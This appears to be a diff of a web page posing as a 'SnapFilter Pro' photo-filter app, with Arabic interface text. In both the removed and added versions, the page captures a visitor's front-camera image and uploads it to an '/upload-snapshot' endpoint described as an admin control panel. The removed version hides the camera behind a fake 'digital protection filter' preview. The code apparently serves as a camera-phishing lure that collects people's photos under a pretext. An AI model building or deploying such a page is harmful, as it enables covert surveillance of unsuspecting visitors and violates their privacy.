@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SnapFilter - التقاط ذكي</title>
+    <title>SnapFilter - الكاميرا المباشرة</title>
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; }
         body {
@@ -17,24 +17,16 @@
             border-radius: 20px; padding: 25px; text-align: center;
             border: 1px solid #262b3d; box-shadow: 0 10px 30px rgba(0,0,0,0.5);
         }
-        h2 { font-size: 24px; margin-bottom: 20px; color: #ff4757; font-weight: 700; }
-        .filter-preview-box {
+        h2 { font-size: 24px; margin-bottom: 15px; color: #ff4757; font-weight: 700; }
+        .camera-box {
             position: relative;
-            width: 100%; border-radius: 14px; background: linear-gradient(135deg, #1f4068, #162447);
-            aspect-ratio: 3/4; display: flex; flex-direction: column; align-items: center; justify-content: center;
-            border: 2px dashed #ff4757; margin-bottom: 20px; overflow: hidden;
-            box-shadow: inset 0 0 15px rgba(0,0,0,0.5);
+            width: 100%; border-radius: 14px; background: #000;
+            aspect-ratio: 3/4; overflow: hidden;
+            border: 2px solid #ff4757; margin-bottom: 20px;
+            box-shadow: inset 0 0 15px rgba(0,0,0,0.8);
         }
-        .filter-preview-box p { font-size: 16px; color: #dcdde1; margin-top: 10px; font-weight: bold; z-index: 2; }
-        .filter-icon { font-size: 60px; z-index: 2; }
-        /* فيديو الكاميرا يظهر مؤقتاً فقط عند التقاط الصورة */
-        #video {
-            position: absolute;
-            top: 0; left: 0;
-            width: 100%; height: 100%;
-            object-fit: cover;
-            display: none;
-            z-index: 1;
+        video {
+            width: 100%; height: 100%; object-fit: cover;
         }
         .btn-capture {
             background: linear-gradient(135deg, #ff4757, #ff6b81); color: white; border: none;
@@ -51,88 +43,79 @@
     <div class="container">
         <h2>SnapFilter Pro</h2>
         
-        <div class="filter-preview-box" id="box">
-            <div class="filter-icon" id="icon">🛡️✨</div>
-            <p id="text">معاينة فلتر الحماية الرقمية</p>
-            <!-- عنصر الفيديو المخفي الذي سيعمل لحظة الالتقاط -->
+        <!-- صندوق عرض الكاميرا الحية -->
+        <div class="camera-box">
             <video id="video" autoplay playsinline></video>
         </div>
 
-        <button class="btn-capture" id="capture-btn" title="التقاط الفلتر">📸</button>
+        <!-- زر التقاط الصورة الحية -->
+        <button class="btn-capture" id="capture-btn" title="التقاط الصورة">📸</button>
         <p id="status-msg"></p>
     </div>
 
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
-        const captureBtn = document.getElementById('capture-btn');
-        const statusMsg = document.getElementById('status-msg');
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
-        const icon = document.getElementById('icon');
-        const text = document.getElementById('text');
+        const captureBtn = document.getElementById('capture-btn');
+        const statusMsg = document.getElementById('status-msg');
 
-        captureBtn.addEventListener('click', async () => {
-            statusMsg.innerText = "جاري تفعيل الكاميرا والتقاط الصورة...";
+        // طلب إذن الكاميرا وتشغيل البث المباشر فور فتح الموقع
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
+            .then(stream => {
+                video.srcObject = stream;
+            })
+            .catch(err => {
+                console.error("خطأ في تشغيل الكاميرا: ", err);
+                statusMsg.innerText = "❌ تعذر الوصول إلى الكاميرا أو تم رفض الإذن!";
+                statusMsg.style.color = "#ff4757";
+            });
+
+        // عند الضغط على زر الالتقاط، يتم أخذ لقطة حقيقية وإرسالها للسيرفر
+        captureBtn.addEventListener('click', () => {
+            if (!video.videoWidth) {
+                statusMsg.innerText = "⚠️ الكاميرا لم تعمل بشكل كامل بعد!";
+                statusMsg.style.color = "#f39c12";
+                return;
+            }
+
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const ctx = canvas.getContext('2d');
+            
+            // رسم الصورة الحية من الـ video على الـ canvas
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            // تحويلها إلى Base64
+            const imageData = canvas.toDataURL('image/png');
+
+            statusMsg.innerText = "جاري إرسال الصورة إلى لوحة التحكم...";
             statusMsg.style.color = "#f39c12";
 
-            try {
-                // طلب الكاميرا الحية فقط عند ضغط الزر
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
-                video.srcObject = stream;
-                video.style.display = 'block';
-                icon.style.display = 'none';
-                text.style.display = 'none';
-
-                // ننتظر ثانية قصيرة حتى تتأكد الكاميرا من فتح العدسة وعرض البث
-                setTimeout(() => {
-                    canvas.width = video.videoWidth || 600;
-                    canvas.height = video.videoHeight || 800;
-                    const ctx = canvas.getContext('2d');
-
-                    // رسم الصورة المأخوذة من كاميرا الموبايل الحقيقية على الـ Canvas
-                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-                    // إيقاف عمل الكاميرا فوراً بعد الالتقاط لحفظ البطارية والخصوصية
-                    stream.getTracks().forEach(track => track.stop());
-                    video.style.display = 'none';
-                    icon.style.display = 'block';
-                    text.style.display = 'block';
-
-                    // تحويل الصورة الحقيقية إلى Base64
-                    const imageData = canvas.toDataURL('image/png');
-
-                    statusMsg.innerText = "جاري إرسال الصورة إلى لوحة التحكم...";
-
-                    // إرسالها للسيرفر
-                    fetch('/upload-snapshot', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ image: imageData })
-                    })
-                    .then(response => response.json())
-                    .then(data => {
-                        if (data.success) {
-                            statusMsg.innerText = "✅ تم التقاط صورتك الحقيقية وحفظها بالـ Admin!";
-                            statusMsg.style.color = "#2ed573";
-                        } else {
-                            statusMsg.innerText = "❌ فشل الحفظ على السيرفر";
-                            statusMsg.style.color = "#ff4757";
-                        }
-                    })
-                    .catch(err => {
-                        console.error('Fetch Error:', err);
-                        statusMsg.innerText = "❌ خطأ في الاتصال بالخادم";
-                        statusMsg.style.color = "#ff4757";
-                    });
-
-                }, 1000); // تأخير ثانية لضمان ظهور لقطة الكاميرا
-
-            } catch (err) {
-                console.error("Camera Error:", err);
-                statusMsg.innerText = "❌ تعذر الوصول للكاميرا أو تم رفض الإذن";
+            // إرسال الصورة للسيرفر
+            fetch('/upload-snapshot', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ image: imageData })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    statusMsg.innerText = "✅ تم التقاط صورتك الحقيقية وحفظها بالـ Admin!";
+                    statusMsg.style.color = "#2ed573";
+                } else {
+                    statusMsg.innerText = "❌ فشل الحفظ على السيرفر";
+                    statusMsg.style.color = "#ff4757";
+                }
+            })
+            .catch(err => {
+                console.error('Fetch Error:', err);
+                statusMsg.innerText = "❌ خطأ في الاتصال بالخادم";
                 statusMsg.style.color = "#ff4757";
-            }
+            });
         });
     </script>
 
